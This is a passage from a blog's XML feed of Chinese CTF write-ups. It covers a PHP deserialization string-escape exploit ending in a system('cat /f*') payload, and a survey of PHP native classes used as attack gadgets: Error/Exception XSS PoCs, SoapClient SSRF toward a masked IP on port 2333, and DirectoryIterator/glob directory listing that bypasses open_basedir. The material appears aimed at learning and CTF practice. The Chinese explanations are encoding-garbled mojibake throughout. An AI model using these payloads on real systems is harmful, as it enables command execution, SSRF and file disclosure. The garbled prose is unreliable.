class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>&#125; <br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;B&#x27;</span>];<br>    <span class="hljs-variable">$rap</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">jump</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$baskerball</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$rap</span>);<br>    <span class="hljs-variable">$success</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">sw</span>(<span class="hljs-variable">$baskerball</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$success</span>;<br><br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼š</p><p>æˆ‘ä»¬æœ€ç»ˆè¦åˆ©ç”¨evalå‘½ä»¤æ‰§è¡Œ</p><p>ikunä¼šè¢«æ›¿æ¢æˆkkï¼Œä¹Ÿå°±æ˜¯è¯´æ¯å››ä¸ªå­—ç¬¦ä¼šé€ƒé€¸ä¸¤ä¸ª</p><p>è€Œæˆ‘ä»¬éœ€è¦é€ƒé€¸  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-built_in">pwd</span><span class="hljs-string">&quot;;s:xx:&quot;</span><br></code></pre></td></tr></table></figure><p>éœ€è¦18&#x2F;2ä¸ªikun</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sing</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$xx</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;x=<span class="hljs-variable">$xx</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;x);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;win!&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">sing</span>(<span class="hljs-string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">seeeeer.php?A=ikunikunikunikunikunikunikunikunikun&amp;B=<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-keyword">pwd</span><span class="hljs-string">&quot;;O:4:&quot;</span>sing<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>x<span class="hljs-string">&quot;;s:18:&quot;</span><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /f*&#x27;</span>);<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215191845070.png" alt="image-20231215191845070"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å¤©å‘½ä¹‹å­&quot;&gt;&lt;a href=&quot;#å¤©å‘½ä¹‹å­&quot; class=&quot;headerlink&quot; title=&quot;å¤©å‘½ä¹‹å­&quot;&gt;&lt;/a&gt;å¤©å‘½ä¹‹å­&lt;/h1&gt;&lt;p&gt;æ‰“å¼€ç¯å¢ƒ&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>phpåŸç”Ÿç±»</title>
    <link href="http://example.com/2023/12/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <id>http://example.com/2023/12/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</id>
    <published>2023-12-15T09:24:45.000Z</published>
    <updated>2023-12-15T09:27:05.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ–°ç”Ÿèµ›é‡åˆ°äº†ä¸€é“é¢˜éœ€è¦åˆ©ç”¨PHPåŸç”Ÿç±»ï¼Œç”±äºè‡ªå·±å¾ˆèœï¼ŒèŠ±äº†å¾ˆé•¿æ—¶é—´æ‰åšå‡ºæ¥ã€‚è¶å‘¨æœ«æœ‰æ—¶é—´æ€»ç»“ä¸€ä¸‹å¸¸è§çš„PHPåŸç”Ÿç±»</p><ul><li>Error</li><li>Exception</li><li>SoapClient</li><li>Directorylterator</li><li>SimpleXMLElement</li></ul><h1 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error&#x2F;Exception"></a>Error&#x2F;Exception</h1><h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><ul><li>é€‚ç”¨äºphp7</li><li>å¼€å¯æŠ¥é”™</li></ul><h3 id="Errorç±»"><a href="#Errorç±»" class="headerlink" title="Errorç±»"></a>Errorç±»</h3><p><strong>ç±»æ‘˜è¦</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Error</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">Throwable</span> &#123;<br>    <span class="hljs-comment">/* å±æ€§ */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;<br>    <span class="hljs-comment">/* æ–¹æ³• */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span><br> <br></code></pre></td></tr></table></figure><p><strong>ç±»å±æ€§</strong></p><ul><li>messageï¼šé”™è¯¯æ¶ˆæ¯å†…å®¹</li><li>codeï¼šé”™è¯¯ä»£ç </li><li>fileï¼šæŠ›å‡ºé”™è¯¯çš„æ–‡ä»¶å</li><li>lineï¼šæŠ›å‡ºé”™è¯¯åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œæ•°</li></ul><p><strong>ç±»æ–¹æ³•</strong></p><ul><li><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> â€” åˆå§‹åŒ– error å¯¹è±¡</li><li><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> â€” è·å–é”™è¯¯ä¿¡æ¯</li><li><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> â€” è¿”å›å…ˆå‰çš„ Throwable</li><li><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> â€” è·å–é”™è¯¯ä»£ç </li><li><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> â€” è·å–é”™è¯¯å‘ç”Ÿæ—¶çš„æ–‡ä»¶</li><li><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> â€” è·å–é”™è¯¯å‘ç”Ÿæ—¶çš„è¡Œå·</li><li><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> â€” è·å–è°ƒç”¨æ ˆï¼ˆstack traceï¼‰</li><li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> â€” è·å–å­—ç¬¦ä¸²å½¢å¼çš„è°ƒç”¨æ ˆï¼ˆstack traceï¼‰</li><li><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> â€” error çš„å­—ç¬¦ä¸²è¡¨è¾¾</li><li><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> â€” å…‹éš† error</li></ul><h3 id="ä½¿ç”¨Errorå†…ç½®ç±»æ¥æ„é€ xss"><a href="#ä½¿ç”¨Errorå†…ç½®ç±»æ¥æ„é€ xss" class="headerlink" title="ä½¿ç”¨Errorå†…ç½®ç±»æ¥æ„é€ xss"></a>ä½¿ç”¨Errorå†…ç½®ç±»æ¥æ„é€ xss</h3><p>Errorç±»æ˜¯phpçš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨äºè‡ªå®šä¹‰ä¸€ä¸ªErrorã€‚ç”±äºå®ƒå†…ç½®çš„__toString()æ–¹æ³•ï¼Œåœ¨php7ä¸‹å¯èƒ½é€ æˆxssï¼Œå¸¸ç”¨äºååºåˆ—åŒ–ä¸­ã€‚</p><p>å½“phpå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²è¾“å‡ºæ—¶ï¼Œä¼šè§¦å‘__toStringæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215153028854.png" alt="image-20231215153028854"></p><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><ul><li>é€‚ç”¨äºphp5ã€7</li><li>å¼€å¯æŠ¥é”™</li></ul><h3 id="Exceptionç±»"><a href="#Exceptionç±»" class="headerlink" title="Exceptionç±»"></a>Exceptionç±»</h3><p><strong>ç±»æ‘˜è¦</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Exception</span> &#123;<br>    <span class="hljs-comment">/* å±æ€§ */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;<br>    <span class="hljs-comment">/* æ–¹æ³• */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">private</span> <span class="hljs-title function_ invoke__">__clone</span> ( ) : <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç±»å±æ€§</strong></p><ul><li>messageï¼šé”™è¯¯æ¶ˆæ¯å†…å®¹</li><li>codeï¼šé”™è¯¯ä»£ç </li><li>fileï¼šæŠ›å‡ºé”™è¯¯çš„æ–‡ä»¶å</li><li>lineï¼šæŠ›å‡ºé”™è¯¯åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œæ•°</li></ul><p><strong>ç±»æ–¹æ³•</strong></p><ul><li><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> â€” å¼‚å¸¸æ„é€ å‡½æ•°</li><li><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> â€” è·å–å¼‚å¸¸æ¶ˆæ¯å†…å®¹</li><li><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> â€” è¿”å›å¼‚å¸¸é“¾ä¸­çš„å‰ä¸€ä¸ªå¼‚å¸¸</li><li><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> â€” è·å–å¼‚å¸¸ä»£ç </li><li><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> â€” åˆ›å»ºå¼‚å¸¸æ—¶çš„ç¨‹åºæ–‡ä»¶åç§°</li><li><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> â€” è·å–åˆ›å»ºçš„å¼‚å¸¸æ‰€åœ¨æ–‡ä»¶ä¸­çš„è¡Œå·</li><li><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> â€” è·å–å¼‚å¸¸è¿½è¸ªä¿¡æ¯</li><li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> â€” è·å–å­—ç¬¦ä¸²ç±»å‹çš„å¼‚å¸¸è¿½è¸ªä¿¡æ¯</li><li><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> â€” å°†å¼‚å¸¸å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²</li><li><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> â€” å¼‚å¸¸å…‹éš†</li></ul><h3 id="ä½¿ç”¨Exceptionç±»æ„é€ xss"><a href="#ä½¿ç”¨Exceptionç±»æ„é€ xss" class="headerlink" title="ä½¿ç”¨Exceptionç±»æ„é€ xss"></a>ä½¿ç”¨Exceptionç±»æ„é€ xss</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215153244269.png" alt="image-20231215153244269"></p><h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>SoapClinetæ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®webæœåŠ¡çš„PHPå®¢æˆ·ç«¯</p><p><strong>ç±»æ‘˜è¦</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs smali">SoapClient &#123;<br>    /* æ–¹æ³• */<br>   <span class="hljs-keyword"> public</span> __construct ( string|null $wsdl ,<span class="hljs-built_in"> array </span>$options = [] )<br>   <span class="hljs-keyword"> public</span> __call ( string $name ,<span class="hljs-built_in"> array </span>$args )<span class="hljs-keyword"> :</span> mixed<br>   <span class="hljs-keyword"> public</span> __doRequest ( string $request , string $location , string $action ,<span class="hljs-built_in"> int </span>$version , bool $oneWay = false )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getCookies ( )<span class="hljs-keyword"> :</span><span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>   <span class="hljs-keyword"> public</span> __getFunctions ( )<span class="hljs-keyword"> :</span> array|null<br>   <span class="hljs-keyword"> public</span> __getLastRequest ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastRequestHeaders ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastResponse ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastResponseHeaders ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getTypes ( )<span class="hljs-keyword"> :</span> array|null<br>   <span class="hljs-keyword"> public</span> __setCookie ( string $name , string|null $value = null )<span class="hljs-keyword"> :</span> void<br>   <span class="hljs-keyword"> public</span> __setLocation ( string $location = <span class="hljs-string">&quot;&quot;</span> )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __setSoapHeaders ( SoapHeader|array|null $headers = null )<span class="hljs-keyword"> :</span> bool<br>   <span class="hljs-keyword"> public</span> __soapCall ( string $name ,<span class="hljs-built_in"> array </span>$args , array|null $options = null , SoapHeader|array|null $inputHeaders = null ,<span class="hljs-built_in"> array </span>&amp;$outputHeaders = null )<span class="hljs-keyword"> :</span> mixed<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“__callæ–¹æ³•è¢«è§¦å‘åï¼Œå¯ä»¥å‘é€httpå’Œhttpsè¯·æ±‚ã€‚</p><p>è¯¥ç±»æ„é€ å‡½æ•°å¦‚ä¸‹</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span>(mixed $wsdl <span class="hljs-meta">[</span>ï¼Œ<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure><ul><li>ç¬¬ä¸€ä¸ªå‚æ•°ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼</li><li>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œè¯¥å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯å°†è¯·æ±‚å‘é€åˆ°SOAPæœåŠ¡å™¨çš„URLï¼Œuriåˆ™æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</li></ul><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;</span>, <span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç”±äºç¯å¢ƒé—®é¢˜ï¼Œæ²¡æœ‰ç”¨ncæ¼”ç¤º</p><h1 id="Directorylterator"><a href="#Directorylterator" class="headerlink" title="Directorylterator"></a>Directorylterator</h1><p>Directorylteratorç±»æä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£</p><p>Directorylteratorä¸glob:&#x2F;&#x2F;åè®®ç»“åˆå°†æ— è§†open_basedirå¯¹ç›®å½•çš„é™åˆ¶ï¼Œå¯ç”¨æ¥åˆ—ä¸¾æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å…¥?whoami&#x3D;glob:&#x2F;&#x2F;&#x2F;*å³å¯åˆ—å‡ºæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><img src="/../images/image-20231215161339993.png" alt="image-20231215161339993"></p><h1 id="Filesystemlterator"><a href="#Filesystemlterator" class="headerlink" title="Filesystemlterator"></a>Filesystemlterator</h1><p>ä¸Directorylteratorç±»ç›¸åŒï¼Œæä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£</p><p>è¯¥ç±»çš„æ„é€ æ–¹æ³•å°†ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure><h1 id="Globlterator"><a href="#Globlterator" class="headerlink" 